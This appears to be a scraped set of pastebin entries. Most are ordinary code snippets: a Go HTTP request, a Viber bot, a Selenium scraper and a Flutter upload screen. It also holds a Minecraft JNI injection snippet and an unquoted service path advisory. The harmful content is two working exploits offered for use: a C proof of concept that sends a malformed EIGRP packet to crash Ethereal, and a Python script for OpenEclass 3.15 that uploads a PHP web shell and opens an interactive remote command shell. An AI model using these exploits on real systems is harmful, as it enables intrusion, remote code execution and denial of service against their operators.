zHwbJwGQ,Untitled,dereksir,Bash,Friday 12th of April 2024 08:36:25 AM CDT,"<!DOCTYPE html>

<body>
	<div class=""cf-wrapper cf-header cf-error-overview"">
		<h1 data-translate=""block_headline"">Sorry, you have been blocked</h1>
		<h2 class=""cf-subheadline""><span data-translate=""unable_to_access"">You are unable to access</span> g2.com</h2>
	</div>
	<!-- 
	...
	-->

</body>"
Js6hk3Sa,Untitled,dereksir,Go,Friday 12th of April 2024 08:30:37 AM CDT,"package main

import (
	""fmt""
	""io""
    ""net/http""
)

func main() {
    // create custom HTTP client
    client := &http.Client{
        Transport: &http.Transport{},
    }
	
	// create custom HTTP client 
    client := &http.Client{
        Transport: &http.Transport{},
    }
 
    // create HTTP request
    req, err := http.NewRequest(""GET"", ""https://www.g2.com/products/visual-studio/reviews"", nil)
    if err != nil {
        // Handle error
        return
    }
 
    // set User-Agent header
    req.Header.Set(""User-Agent"", ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"")

	// make HTTP request
    response, err := client.Do(req)
    if err != nil {
        fmt.Println(""Error:"", err)
        return
    }
    // close the response body
    defer response.Body.Close()
 
    // read the response body
    body, err := io.ReadAll(response.Body)
    if err != nil {
        fmt.Println(""Error:"", err)
        return
    }
 
    // print the text content
    fmt.Println(string(body))
}"
8mGTtKjf,Untitled,test12333,C++,Friday 12th of April 2024 08:17:21 AM CDT,"theMinecraft = nullptr;
    while ( !theMinecraft ) { theMinecraft = env->JNU_GetStaticFieldByName(""6481"", ""strictfp"", ""L6481;"").l; }


    while ( 1 ) {
        static auto timer = GetTickCount64( );
        if ( GetTickCount64( ) - timer > 1000 ) {
            theWorld = env->GetObjectField(theMinecraft, env->GetFieldID(env->GetObjectClass(theMinecraft), ""D"", ""L0405;""));

            thePlayer = env->CallObjectMethod(theMinecraft, env->GetMethodID(env->GetObjectClass(theMinecraft), ""volatile"", ""()L8371;""));


            if ( !theWorld || !thePlayer )
                continue; 
            auto loadedEntityListMid = env->GetMethodID(env->GetObjectClass(theWorld), ""private"", ""()Ljava/util/Collection;"");

            auto loadedEntityList = env->CallObjectMethod(theWorld, loadedEntityListMid);
            if (loadedEntityList) {
                printf(""loadedEntityList %p\n"", loadedEntityList);
                auto elistArray = (jobjectArray)env->JNU_CallMethodByNameV(loadedEntityList, ""toArray"", ""()[Ljava/lang/Object;"").l;
                printf(""elistArray %p\n"", elistArray);

                auto len = env->GetArrayLength((jarray)elistArray);
                printf(""len %d\n"", len);
                for (int i = 0; i < len; ++i) {
                    auto ent = env->GetObjectArrayElement(elistArray, i);
                    printf(""ent: %p\n"", ent);
                    if (ent) {
                        auto _class = env->JNU_CallMethodByNameV(ent, ""getClass"", ""()Ljava/lang/Class;"", nullptr).l;
                        printf(""class: %p\n"", _class);
                        auto jstr = (jstring)env->JNU_CallMethodByNameV(_class, ""getName"", ""()Ljava/lang/String;"", nullptr).l;
                        auto cname = env->GetStringUTFChars(jstr);

                        printf(""cname %s\n"", cname);

                        env->ReleaseStringUTFChars(jstr, cname);
                    }
                    
                    env->DeleteLocalRef(ent);
                }

                env->DeleteLocalRef(elistArray);
                env->DeleteLocalRef(loadedEntityList);
            }

            env->DeleteLocalRef( theWorld );
            env->DeleteLocalRef( thePlayer );

            timer = GetTickCount64( );
        }

        if ( GetAsyncKeyState( VK_DELETE ) & 1 ) {
            main_vm->DetachCurrentThread( );

            FreeConsole( );
            FreeLibraryAndExitThread( g_module, 0 );
        }
    }"
Q7Y4rWF9,ViberBot,askanton,Python,Friday 12th of April 2024 08:14:23 AM CDT,"import json
import logging

import requests
from flask import Flask, request, Response
from viberbot import Api
from viberbot.api.bot_configuration import BotConfiguration
from viberbot.api.messages.text_message import TextMessage
from viberbot.api.messages.url_message import URLMessage
from viberbot.api.viber_requests import ViberFailedRequest, ViberConversationStartedRequest
from viberbot.api.viber_requests import ViberMessageRequest
from viberbot.api.viber_requests import ViberSubscribedRequest

app = Flask(__name__)

viber = Api(BotConfiguration(
    name='Bot Name',
    avatar='',
    auth_token='**********-************-*************'
))

@app.route('/', methods=['POST'])
def incoming():
    #logger.debug(""received request. post data: {0}"".format(request.get_data()))
    # every viber message is signed, you can verify the signature using this method
    if not viber.verify_signature(request.get_data(), request.headers.get('X-Viber-Content-Signature')):
        return Response(status=403)

    # this library supplies a simple way to receive a request object
    viber_request = viber.parse_request(request.get_data())

    if isinstance(viber_request, ViberMessageRequest):
        message = viber_request.message
        # lets echo back
        viber.send_messages(viber_request.sender.id, [
            message
        ])
    elif isinstance(viber_request, ViberSubscribedRequest):
        viber.send_messages(viber_request.get_user.id, [
            TextMessage(text=""thanks for subscribing!"")
        ])
    elif isinstance(viber_request, ViberFailedRequest):
        logger.warn(""client failed receiving message. failure: {0}"".format(viber_request))

    return Response(status=200)

if __name__ == ""__main__"":
    context = ('server.crt', 'server.key')
    app.run(port=""8087"")"
MHxHp11M,scrape_market.py,Abhisek92,Python,Friday 12th of April 2024 08:08:48 AM CDT,"import warnings
import argparse
from pathlib import Path
from selenium import webdriver
from datetime import datetime, timedelta
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
from webdriver_manager.core.os_manager import ChromeType
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service as ChromiumService


def wait_and_click(driver, locator, wait_time=20):
    """"""
    Waits for an element to be clickable and clicks it.
    Accepts both XPATH and ID locators.
    """"""
    element = WebDriverWait(driver, wait_time).until(
        EC.element_to_be_clickable(locator)
    )
    element.click()

def setup_driver(download_dir):
    """"""
    Initializes and returns a Chrome WebDriver with options.
    """"""
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    options.add_argument('--enable-logging')
    options.add_experimental_option(""prefs"", {""download.default_directory"": download_dir})
    options.add_experimental_option(""detach"", True)
    driver = webdriver.Chrome(service=ChromiumService(ChromeDriverManager(chrome_type=ChromeType.CHROMIUM).install()), options=options)
    return driver

def select_date(driver, target_date):
    today = date.today()
    month_difference = ((target_date.year -today.year) * 12) - today.month + target_date.month
    day = target_date.strftime(""%d"")

    try:
        wait_and_click(driver, (By.ID, ""data-end-date""))
        if month_difference < 0:
            for _ in range(abs(month_difference)):
                wait_and_click(driver, (By.CSS_SELECTOR, "".fa.fa-chevron-left""))
        elif month_difference > 0:
            for _ in range(month_difference):
                wait_and_click(driver, (By.CSS_SELECTOR, "".fa.fa-chevron-right""))
        wait_and_click(driver, (By.ID, f'//span[text()=""{day}""]'))
    except Exception as e:
        warnings.warn(f""An error occurred: {e}"")

def navigate_and_export_data(driver, target_date):
    """"""
    Navigates through the UI and exports data for a given month and day.
    """"""
    try:
        # Open date picker
        select_date(driver=driver, target_date=target_date)

        # Export data to Excel
        wait_and_click(driver, (By.XPATH, '//span[@title=""Export data to Excel""]'))

    except Exception as e:
        warnings.warn(f""An error occurred: {e}"")

def scrape(driver, target_date):
    driver.get(""https://www.nordpoolgroup.com/en/market-data12/Intraday/Market-data1/Market-data1/Overview/?dd=SE3&view=table"")
    navigate_and_export_data(driver=driver, target_date=target_date)


if __name__ == ""__main__"":
    parser = argparse.ArgumentParser(description='Scrape NordPoolGroup Market Data')
    parser.add_argument('-d', '--date_format', default=""%d-%m-%Y"", type=str, help=""Set date format"", dest=""date_format"")
    parser.add_argument('-s', '--start_date', type=str, help='Start date', dest=""start_date"")
    parser.add_argument('-e', '--end_date', type=str, help='End date', dest=""end_date"")
    parser.add_argument('-f', '--file', type=str, help=""Path to file containing dates"", dest=""file_path"")
    parser.add_argument('-o', '--dst_dir', type=str, help='Destination directory for download', dest=""dst_dir"")

    args = parser.parse_args()

    if args.dst_dir is None:
        dst_dir = Path()
    else:
        dst_dir = Path(args.dst_dir)

    dst_dir.mkdir(parents=True, exist_ok=True)

    date_format = args.date_format

    if args.start_date is not None:
        try:
            start_date = datetime.strptime(args.start_date, date_format)
        except ValueError:
            warnings.warn(f""Invalid date or Illformed date wrt {date_format} format: {args.start_date}"")
            start_date = None

    if args.start_date is not None:
        try:
            end_date = datetime.strptime(args.end_date, date_format)
        except ValueError:
            warnings.warn(f""Invalid date or Illformed date wrt {date_format} format: {args.end_date}"")
            end_date = None

    if (start_date is not None) and (end_date is not None):
        assert start_date <= end_date, ""Start date ({start_date}) cannot be later than end date ({end_date}) !!""

    dates = None
    if args.file_path is not None:
        file_path = Path(args.file_path)
        if file_path.is_file():
            with open(file_path, 'r') as src:
                lines = src.readlines()

            df = lines[0]
            dates = list()
            for ds in lines[1:]:
                try:
                    dt = datetime.strptime(ds, df)
                except ValueError as ve:
                    warnings.warn(f""Invalid date or Illformed date wrt {df} format: {ds}"")
                if ((start_date is None) or (start_date <= dt)) and ((end_date is None) or (end_date >= dt)):
                    dates.append(dt)
            dates = list(set(dates))

    if dates is None:
        if start_date is None:
            raise ValueError(""Start date must be set when file with dates are not specified!"")
        if end_date is None:
            raise ValueError(""End date must be set when file with dates are not specified!"")

        dates = list()
        current_date = start_date
        while current_date <= end_date:
            dates.append(current_date)
            current_date += timedelta(days=1)

    driver = setup_driver(str(dst_dir))
    for date in dates:
        scrape(driver=driver, target_date=date)
    driver.quit()
"
01KFY5ad,Ethereal - EIGRP Dissector TLV_IP_INT Long IP Remote Denial of Service - CVE-2004-0176,FlyFar,C,Friday 12th of April 2024 07:51:04 AM CDT,"/*
 * Ethereal network protocol analyzer
 * EIGRP Dissector TLV_IP_INT Long IP Address Overflow
 * vulnerability
 * proof of concept code
 * version 1.0 (Mar 26 2004)
 *
 * by R&#65533;mi Denis-Courmont < ethereal at simphalampin dot com >
 *   www simphalempin com dev 
 *
 * This vulnerability was found by:
 *   Stefan Esser s.esser e-matters de
 * whose original advisory may be fetched from:
 *   security e-matters de advisories 032004.html
 *
 * Vulnerable:
 *  - Ethereal v0.10.2
 *
 * Not vulnerable:
 *  - Ethreal v0.10.3
 *
 * Note: this code will simply trigger a denial of service on Ethereal.
 * It should really be possible to exploit the buffer overflow
 * (apparently up to 29 bytes overflow), but I haven't tried.
 */


#include <string.h>
#include <stdio.h>

#include <sys/types.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netdb.h>

static const char packet[] =
        ""\x01"" /* Version */
        ""\x04"" /* Opcode: Reply */
        ""\x00\x00"" /* Checksum (invalid) */
        ""\x00\x00\x00\x00"" /* Flags */
        ""\x00\x00\x00\x00"" /* Sequence number */
        ""\x00\x00\x00\x00"" /* ACK */
        ""\x00\x00\x00\x00"" /* AS number */

        /* IP internal routes TLV */
        ""\x01\x02"" /* Type */
        ""\x00\x39"" /* Length (should be 0x1C) */
        ""\x00\x00\x00\x00"" /* Next hop */
        ""\x00\x00\x00\x00"" /* Delay */
        ""\x00\x00\x00\x00"" /* Bandwitdh */
        ""\x00\x00\x00"" /* MTU */
        ""\x00"" /* Hop count: directly connected */
        ""\xff"" /* Reliability: maximum */
        ""\x01"" /* Load: minimum */
        ""\x00\x00"" /* Reserved */
        ""\xff"" /* Prefix length: should be > 0 and <= 32 */
        ""\x00\x00\x00"" /* Destination network */
        ""\xff\xff\xff\xff"" ""\xff\xff\xff\xff""
        ""\xff\xff\xff\xff"" ""\xff\xff\xff\xff""
        ""\xff\xff\xff\xff"" ""\xff\xff\xff\xff""
        ""\xff\xff\xff\xff"" ""\xff"" /* buffer overflow */
;


static int
proof (const struct sockaddr_in *dest)
{
        int fd;
        size_t len;

        fd = socket (PF_INET, SOCK_RAW, 88);
        if (fd == -1)
        {
                perror (""Raw socket error"");
                return 1;
        }

        len = sizeof (packet) - 1;
        if (sendto (fd, packet, len, 0, (const struct sockaddr *)dest,
                        sizeof (struct sockaddr_in)) != len)
        {
                perror (""Packet sending error"");
                close (fd);
                return 1;
        }

        puts (""Packet sent!"");
        close (fd);
        return 0;
}


static int
usage (const char *path)
{
        fprintf (stderr, ""Usage: %s <hostname/IP>\n"", path);
        return 2;
}


int
main (int argc, char *argv[])
{
        struct sockaddr *dest;

        puts (""Ethereal EIGRP Dissector TLV_IP_INT Long IP Address Overflow\n""
                ""proof of concept code\n""
                ""Copyright (C) 2004 R<E9>mi Denis-Courmont ""
                ""<\x65\x74\x68\x65\x72\x65\x61\x6c\x40\x73\x69\x6d\x70""
                ""\x68\x61\x6c\x65\x6d\x70\x69\x6e\x2e\x63\x6f\x6d>\n"");


        if (argc != 2)
                return usage (argv[0]);
        else
        {
                struct addrinfo help, *res;
                int check;

                memset (&help, 0, sizeof (help));
                help.ai_family = PF_INET;

                check = getaddrinfo (argv[1], NULL, &help, &res);
                if (check)
                {
                        fprintf (stderr, ""%s: %s\n"", argv[1],
                                        gai_strerror (check));
                        return 1;
                }

                dest = res->ai_addr;
        }

        return proof ((const struct sockaddr_in *)dest);
}
            "
Hec1ksNq,"trying to post text with images,videos/audios files",jevixlugya,Dart,Friday 12th of April 2024 07:28:00 AM CDT,"class Postscreen extends StatefulWidget {
  const Postscreen({Key? key}) : super(key: key);

  @override
  State<Postscreen> createState() => _PostscreenState();
}

class _PostscreenState extends State<Postscreen> {
  //post messges
  final FirestoreDatabase database = FirestoreDatabase();
  final posttitleController = TextEditingController();
  final postController = TextEditingController();
  final postfileController= TextEditingController();
  final FirebaseStorage storage = FirebaseStorage.instance;
  final currentUser = FirebaseAuth.instance.currentUser!;

  @override
  initState() {
    super.initState();
  }
//pick files and uploading them to firebase after i download the url
  PlatformFile? pickedFile;
  UploadTask? uploadTask;
  Future selectFile()async{
    final result= await FilePicker.platform.pickFiles();
    if (result==null) return;
    setState(() {
      pickedFile=result.files.first;
    });
    String? mimeStr = lookupMimeType(pickedFile!.path!);
    var fileType = mimeStr?.split('/');
    print('file type $fileType');
    try {

      final path = 'postfiles/${pickedFile!.name}';
      final file = File(pickedFile!.path!);
      final ref = FirebaseStorage.instance.ref().child(path);
      uploadTask = ref.putFile(file);
      final imageUrl = await uploadTask!.whenComplete(() {});
      final urlDownload = await imageUrl.ref.getDownloadURL();
      print('firebase image =$urlDownload');

      setState(() {
        postfileController.text = urlDownload;
      });
    }catch(e){
    ScaffoldMessenger.of(context).showSnackBar(
    const SnackBar(
    content: Text(
    'check your details /network, and try again',
    ),
    ),
    );
    }
  }


//here i was posting the content
  Future<void> postMessage() async {

    if (postController.text.isNotEmpty && posttitleController.text.isNotEmpty) {
      String message = postController.text;
      String title = posttitleController.text;
      String fileurl=postfileController.text;
      database.addPosts(message, title,fileurl);
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(
          content: Text(
            'Post is succesfully created..',
          ),
        ),
      );
    } else {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(
          content: Text(
            'please enter some text',
          ),
        ),
      );
    }
    postController.clear();
    posttitleController.clear();

  }

  @override
  void dispose() {
    postController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    //String? mimeStr = lookupMimeType(pickedFile!.path!);
    //var fileType = mimeStr?.split('/');
    //print('file type ${fileType}');
    return Scaffold(
      backgroundColor: const Color.fromARGB(255, 245, 242, 242),
      appBar: AppBar(
          leading: const Icon(Icons.create,color: Colors.white,size: 32,),
        title: const Text('CREATE A POST',
            style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
        backgroundColor: Colors.deepPurple
      ),
      body: SafeArea(
        child: SingleChildScrollView(
          child: Column(
            children: <Widget>[
              //padding: const EdgeInsets.symmetric(horizontal: 16.0),
              Container(
                margin: const EdgeInsets.all(8.0),
                child: TextField(
                  controller: posttitleController,
                  keyboardType: TextInputType.multiline,
                  textInputAction: TextInputAction.done,
                  maxLines: 2,
                  decoration: const InputDecoration(
                    //labelText: 'Say something to Community ',
                    hintText: 'Title ',
                    //prefixIcon: Icon(Icons.add),
                    border: OutlineInputBorder(),
                    //filled:true,
                  ),
                ),
              ),
              _gap(),
              Container(
                margin: const EdgeInsets.all(8.0),
                child: TextField(
                  controller: postController,
                  keyboardType: TextInputType.multiline,
                  textInputAction: TextInputAction.done,
                  maxLines: 5,
                  decoration: const InputDecoration(
                    //labelText: 'Say something to Community ',
                    hintText: 'Say something to Community ',
                    //prefixIcon: Icon(Icons.add),
                    border: OutlineInputBorder(),
                    //filled:true,
                  ),
                ),
              ),
              _gap(),
              const SizedBox(height: 10),
			// image container if the image is not null
              if (pickedFile != null)
                //if(fileType=='[image, jpeg]')
                Container(
                    alignment: Alignment.center,
                    width: double.infinity,
                    //height: 300,
                    color: Colors.grey[300],
                    child: Image.file(
                      File(pickedFile!.path!),
                      width: double.infinity,
                      fit: BoxFit.cover,
                    )),


          
              _gap(),
              Container(
                margin: const EdgeInsets.all(8.0),
                child: TextField(
                  controller: postfileController,
                  keyboardType: TextInputType.multiline,
                  textInputAction: TextInputAction.done,
                  readOnly: true,
                  maxLines: 1,
                  decoration: const InputDecoration(
                    //labelText: 'Say something to Community ',
                    hintText: 'File url',
                    //prefixIcon: Icon(Icons.add),
                    border: OutlineInputBorder(),
                    //filled:true,
                  ),
                ),
              ),
              _gap(),
              SizedBox(
                //width: double.infinity,
                child: ElevatedButton(
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.deepPurple,
                    shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(4)),
                  ),
                  onPressed: selectFile,
                  child: const Padding(
                    padding: EdgeInsets.all(10.0),
                    child: Text(
                      'Upload File',
                      style: TextStyle(
                          fontSize: 16,
                          fontWeight: FontWeight.bold,
                          color: Color.fromARGB(255, 246, 244, 244)),
                    ),
                  ),
                ),
              ),
              _gap(),

              SizedBox(
                //width: double.infinity,
                child: ElevatedButton(
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.deepPurple,
                    shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(4)),
                  ),
                  onPressed: postMessage,
                  child: const Padding(
                    padding: EdgeInsets.all(10.0),
                    child: Text(
                      'Post',
                      style: TextStyle(
                          fontSize: 16,
                          fontWeight: FontWeight.bold,
                          color: Color.fromARGB(255, 248, 247, 247)),
                    ),
                  ),
                ),
              ),
              _gap(),
            ],
          ),
        ),
      ),
    );
  }



  Widget _gap() => const SizedBox(height: 16);
}"
dGW4uksi,Terratec dmx_6fire USB - Unquoted Service Path - CVE-2024-31804,FlyFar,Email,Friday 12th of April 2024 07:19:23 AM CDT,"# Exploit Title:  Terratec dmx_6fire USB - Unquoted Service Path
# Google Dork: null
# Date: 4/10/2024
# Exploit Author: Joseph Kwabena Fiagbor
# Vendor Homepage: https://dmx-6fire-24-96-controlpanel.software.informer.com/download/
# Software Link:
# Version: v.1.23.0.02
# Tested on: windows 7-11
# CVE : CVE-2024-31804

1. Description:

The Terratec dmx_6fire usb installs as a service with an unquoted service
path running
with SYSTEM privileges.
This could potentially allow an authorized but non-privileged local
user to execute arbitrary code with elevated privileges on the system.

2. Proof

> C:\Users\Astra>sc qc ""ttdmx6firesvc""
> {SC] QueryServiceConfig SUCCESS
>
> SERVICE_NAME: ttdmx6firesvc
>         TYPE               : 10  WIN32_OWN_PROCESS
>         START_TYPE         : 2   AUTO_START
>         ERROR_CONTROL      : 1   NORMAL
>         BINARY_PATH_NAME   : C:\Program Files\TerraTec\DMX6FireUSB\ttdmx6firesvc.exe -service
>         LOAD_ORDER_GROUP   : PlugPlay
>         TAG                : 0
>         DISPLAY_NAME       : DMX6Fire Control
>         DEPENDENCIES       : eventlog
>                            : PlugPlay
>         SERVICE_START_NAME : LocalSystem
>
>
            "
1DgUE7Kt,GUnet OpenEclass E-learning platform 3.15 - 'certbadge.php Unrestricted File Upload - CVE-2024-31777,FlyFar,Python,Friday 12th of April 2024 07:15:52 AM CDT,"# Exploit Title: GUnet OpenEclass E-learning platform 3.15 - 'certbadge.php' Unrestricted File Upload
# Date: 2024-02-04
# Exploit Author: Georgios Tsimpidas
# Vendor Homepage: https://www.openeclass.org/
# Software Link: https://download.openeclass.org/files/3.15/
# Version: 3.15 (2024)
# Tested on: Debian Kali (Apache/2.4.57, PHP 8.2.12, MySQL 15.1)
# CVE : CVE-2024-31777
# GUnet OpenEclass <= 3.15 E-learning platform - Unrestricted File

import requests
import argparse
import zipfile
import os
import sys

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RESET = '\033[0m'
ORANGE = '\033[38;5;208m'

MALICIOUS_PAYLOAD = """"""\
<?php

if(isset($_REQUEST['cmd'])){
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        die;
}

?>
""""""

def banner():
    print(f'''{RED}
{YELLOW}
 ============================ Author: Frey ============================
{RESET}''')

def execute_command(openeclass, filename):
    while True:
        # Prompt for user input with ""eclass""
        cmd = input(f""{RED}[{YELLOW}eClass{RED}]~# {RESET}"")

        # Check if the command is 'quit', then break the loop
        if cmd.lower() == ""quit"":
            print(f""{ORANGE}\nExiting...{RESET}"")
            clean_server(openeclass)
            sys.exit()

        # Construct the URL with the user-provided command
        url = f""{openeclass}/courses/user_progress_data/cert_templates/{filename}?cmd={cmd}""

        # Execute the GET request
        try:
            response = requests.get(url)

            # Check if the request was successful
            if response.status_code == 200:
                # Print the response text
                print(f""{GREEN}{response.text}{RESET}"")

        except requests.exceptions.RequestException as e:
            # Print any error that occurs during the request
            print(f""{RED}An error occurred: {e}{RESET}"")

def upload_web_shell(openeclass, username, password):
    login_url = f'{openeclass}/?login_page=1'
    login_page_url = f'{openeclass}/main/login_form.php?next=%2Fmain%2Fportfolio.php'

    # Login credentials
    payload = {
        'next': '/main/portfolio.php',
        'uname': f'{username}',
        'pass': f'{password}',
        'submit': 'Enter'
    }

    headers = {
        'Referer': login_page_url,
    }

    # Use a session to ensure cookies are handled correctly
    with requests.Session() as session:
        # (Optional) Initially visit the login page if needed to get a fresh session cookie or any other required tokens
        session.get(login_page_url)

        # Post the login credentials
        response = session.post(login_url, headers=headers, data=payload)

        # Create a zip file containing the malicious payload
        zip_file_path = 'malicious_payload.zip'
        with zipfile.ZipFile(zip_file_path, 'w') as zipf:
            zipf.writestr('evil.php', MALICIOUS_PAYLOAD.encode())

        # Upload the zip file
        url = f'{openeclass}/modules/admin/certbadge.php?action=add_cert'
        files = {
            'filename': ('evil.zip', open(zip_file_path, 'rb'), 'application/zip'),
            'certhtmlfile': (None, ''),
            'orientation': (None, 'L'),
            'description': (None, ''),
            'cert_id': (None, ''),
            'submit_cert_template': (None, '')
        }
        response = session.post(url, files=files)

        # Clean up the zip file
        os.remove(zip_file_path)

        # Check if the upload was successful
        if response.status_code == 200:
            print(f""{GREEN}Payload uploaded successfully!{RESET}"")
            return True
        else:
            print(f""{RED}Failed to upload payload. Exiting...{RESET}"")
            return False

def clean_server(openeclass):
    print(f""{ORANGE}Cleaning server...{RESET}"")
    # Remove the uploaded files
    requests.get(f""{openeclass}/courses/user_progress_data/cert_templates/evil.php?cmd=rm%20evil.zip"")
    requests.get(f""{openeclass}/courses/user_progress_data/cert_templates/evil.php?cmd=rm%20evil.php"")
    print(f""{GREEN}Server cleaned successfully!{RESET}"")

def main():
    parser = argparse.ArgumentParser(description=""Open eClass – CVE-CVE-2024-31777: Unrestricted File Upload Leads to Remote Code Execution"")
    parser.add_argument('-u', '--username', required=True, help=""Username for login"")
    parser.add_argument('-p', '--password', required=True, help=""Password for login"")
    parser.add_argument('-e', '--eclass', required=True, help=""Base URL of the Open eClass"")
    args = parser.parse_args()

    banner()
    # Running the main login and execute command function
    if upload_web_shell(args.eclass, args.username, args.password):
        execute_command(args.eclass, 'evil.php')

if __name__ == ""__main__"":
    main()
            "
FkQBnUyk,邀您一起看：♥管理-V3.3,xiaomianao666,JavaScript,Friday 12th of April 2024 07:07:39 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥♥管理-V3.3@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbe1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuS+nei1luaWh+S7tlwiLFwicGF0aFwiOlwiY29uZmlnXCIsXCJydWxlXCI6XCJqczpcXG5sZXQgbWV0aG9kO1xcbmxldCByZWx5O1xcbmxldCBjZmdmaWxlID0gXFxcImhpa2VyOi8vZmlsZXMvcnVsZXMvU3JjL0p1L2NvbmZpZy5qc29uXFxcIjtcXG5pZiAoZmlsZUV4aXN0KGNmZ2ZpbGUpKSB7XFxuICAgIGV2YWwoXFxcImxldCBKdWNvbmZpZz1cXFwiICsgZmV0Y2goY2ZnZmlsZSkgKyBcXFwiO1xcXCIpO1xcbiAgICBtZXRob2QgPSBKdWNvbmZpZ1tcXFwi5L6d6LWWXFxcIl0ubWF0Y2goL2h0dHAocyk/OlxcXFwvXFxcXC8uKlxcXFwvLylbMF0gKyAnU3JjSnVNZXRob2QuanMnO1xcbiAgICByZWx5ID0gSnVjb25maWdbXFxcIuS+nei1llxcXCJdO1xcbn1cXG4kLmV4cG9ydHMubWV0aG9kID0gbWV0aG9kO1xcbiQuZXhwb3J0cy5yZWx5ID0gcmVseTtcXG4kLmV4cG9ydHMudmVyc2lvbiA9IDE0O1wifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi5o6l5Y+j5Luj56CBXCIsXCJwYXRoXCI6XCJqaWVrb3VcIixcInJ1bGVcIjpcImpzOlxcbmxldCBtZXRob2Q7XFxubGV0IGNmZ2ZpbGUgPSBcXFwiaGlrZXI6Ly9maWxlcy9ydWxlcy9TcmMvSnUvY29uZmlnLmpzb25cXFwiO1xcbmlmIChmaWxlRXhpc3QoY2ZnZmlsZSkpIHtcXG4gICAgZXZhbChcXFwibGV0IEp1Y29uZmlnPVxcXCIgKyBmZXRjaChjZmdmaWxlKSArIFxcXCI7XFxcIik7XFxuICAgIG1ldGhvZCA9IEp1Y29uZmlnW1xcXCLkvp3otZZcXFwiXS5tYXRjaCgvaHR0cChzKT86XFxcXC9cXFxcLy4qXFxcXC8vKVswXSArICdTcmNKdU1ldGhvZDIuanMnO1xcbn1cXG5yZXF1aXJlKG1ldGhvZCk7XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLkupHlj6Pku6Tlr7zlhaVcIixcInBhdGhcIjpcImltcG9ydFwiLFwicnVsZVwiOlwianM6XFxuZnVuY3Rpb24gY2xvdWRpbXBvcnQodGl0bGUpIHtcXG4gICAgbGV0IHJlbW90ZWZpbGU7XFxuICAgIGxldCBjZmdmaWxlID0gXFxcImhpa2VyOi8vZmlsZXMvcnVsZXMvU3JjL0p1L2NvbmZpZy5qc29uXFxcIjtcXG4gICAgaWYgKGZpbGVFeGlzdChjZmdmaWxlKSkge1xcbiAgICAgICAgZXZhbChcXFwibGV0IEp1Y29uZmlnPVxcXCIgKyBmZXRjaChjZmdmaWxlKSArIFxcXCI7XFxcIik7XFxuICAgICAgICByZW1vdGVmaWxlID0gSnVjb25maWdbXFxcIuS+nei1llxcXCJdLm1hdGNoKC9odHRwKHMpPzpcXFxcL1xcXFwvLipcXFxcLy8pWzBdICsgJ1NyY0p1U2V0LmpzJztcXG4gICAgfVxcbiAgICBpZihyZW1vdGVmaWxlKXtcXG4gICAgICAgIHJlcXVpcmUocmVtb3RlZmlsZSk7XFxuICAgICAgICByZXR1cm4gSllpbXBvcnQoaW5wdXQsdGl0bGUpO1xcbiAgICB9ZWxzZXtcXG4gICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/msqHmnInnlKjov4fogZrpmIXiiJrlsI/nqIvluo/vvJ9cXFwiO1xcbiAgICB9XFxufVxcbiQuZXhwb3J0cyA9IGNsb3VkaW1wb3J0KFxcXCLogZrpmIXiiJpcXFwiKTtcIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuaQnOe0oumhtVwiLFwicGF0aFwiOlwic291c3VvcGFnZVwiLFwicnVsZVwiOlwianM6XFxubGV0IHJlbHlmaWxlID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvY29uZmlnP3J1bGU9XFxcIitNWV9SVUxFLnRpdGxlKS5yZWx5O1xcbnJlcXVpcmUocmVseWZpbGUpO1xcbmxldCBuYW1lID0gZ2V0UGFyYW0oXFxcImtleXdvcmRcXFwiKTtcXG5sZXQgdHlwZSA9IGdldFBhcmFtKFxcXCJ0eXBlXFxcIik7XFxubmV3c291c3VvcGFnZShuYW1lLHR5cGUscmVseWZpbGUpO1wifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi5a+85YWl56Gu6K6k6aG1XCIsXCJwYXRoXCI6XCJpbXBvcnRDb25maXJtXCIsXCJydWxlXCI6XCJqczpcXG5sZXQgcmVseSA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL2NvbmZpZz9ydWxlPVxcXCIrTVlfUlVMRS50aXRsZSkucmVseTtcXG5cXG5yZXF1aXJlKHJlbHkubWF0Y2goL2h0dHAocyk/OlxcXFwvXFxcXC8uKlxcXFwvLylbMF0gKyAnU3JjSnVTZXQuanMnKTtcXG5pbXBvcnRDb25maXJtKE1ZX1JVTEUudGl0bGUpO1wifV0sX